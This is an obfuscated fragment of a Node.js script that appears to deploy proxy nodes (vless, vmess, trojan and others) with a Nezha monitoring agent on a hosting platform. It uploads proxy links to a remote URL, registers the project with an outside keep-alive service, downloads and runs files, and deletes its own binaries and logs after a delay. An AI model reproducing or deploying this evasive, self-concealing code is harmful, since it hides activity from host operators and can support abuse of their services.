_0x3e5560=fs[_0x169832(0x210)](listPath,_0x169832(0x1eb)),_0x37f6cd=_0x3e5560[_0x169832(0x19b)]('\x0a')[_0x169832(0x1f8)](_0x428b26=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x169832(0x1cd)](_0x428b26));if(_0x37f6cd[_0x169832(0x20d)]===0x0)return;const _0x59c156=JSON[_0x169832(0x1c4)]({'nodes':_0x37f6cd});try{const _0x4afca8=await axios[_0x169832(0x187)](UPLOAD_URL+_0x169832(0x18d),_0x59c156,{'headers':{'Content-Type':_0x169832(0x20f)}});return _0x4afca8&&_0x4afca8[_0x169832(0x18e)]===0xc8?(console[_0x169832(0x191)](_0x169832(0x173)),_0x4afca8):null;}catch(_0x258452){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x3bc4a2=_0x174d,_0x2d0bbe=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x2d0bbe[_0x3bc4a2(0x21b)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x2d0bbe[_0x3bc4a2(0x21b)](phpPath);process['platform']===_0x3bc4a2(0x1c5)?exec(_0x3bc4a2(0x211)+_0x2d0bbe[_0x3bc4a2(0x217)]('\x20')+_0x3bc4a2(0x209),_0x14c42d=>{const _0x3c13f8=_0x3bc4a2;console['clear'](),console[_0x3c13f8(0x191)](_0x3c13f8(0x16b)),console[_0x3c13f8(0x191)](_0x3c13f8(0x16e));}):exec(_0x3bc4a2(0x1b7)+_0x2d0bbe['join']('\x20')+_0x3bc4a2(0x192),_0x2145a9=>{const _0x489ec0=_0x3bc4a2;console['clear'](),console['log'](_0x489ec0(0x16b)),console['log']('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x4f29f5=_0x2645ee;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x4f29f5(0x191)](_0x4f29f5(0x1e4));return;}try{const _0x56d8c1=await axios[_0x4f29f5(0x187)]('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':'application/json'}});return console[_0x4f29f5(0x191)](_0x4f29f5(0x212)),_0x56d8c1;}catch(_0x579055){return console[_0x4f29f5(0x1f3)](_0x4f29f5(0x1fa)+_0x579055[_0x4f29f5(0x18b)]),null;}}async function startserver(){const _0x25aa72=_0x2645ee;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x5a5777){console[_0x25aa72(0x1f3)](_0x25aa72(0x1b9),_0x5a5777);}}startserver()[_0x2645ee(0x183)](_0x394151=>{const _0x5e364c=_0x2645ee;console['error'](_0x5e364c(0x1b3),_0x394151);}),app[_0x2645ee(0x1c8)]('/',async function(_0x481e84,_0x3f4c11){const _0x52e86b=_0x2645ee;try{const _0xca073a=path['join'](__dirname,_0x52e86b(0x16f)),_0x49bfbc=await fs[_0x52e86b(0x200)][_0x52e86b(0x1ce)](_0xca073a,_0x52e86b(0x198));_0x3f4c11[_0x52e86b(0x175)](_0x49bfbc);}catch(_0x2de0f5){_0x3f4c11['send'](_0x52e86b(0x17b));}}),app['listen'](PORT,()=>console[_0x2645ee(0x191)](_0x2645ee(0x1aa)+PORT+'!'));
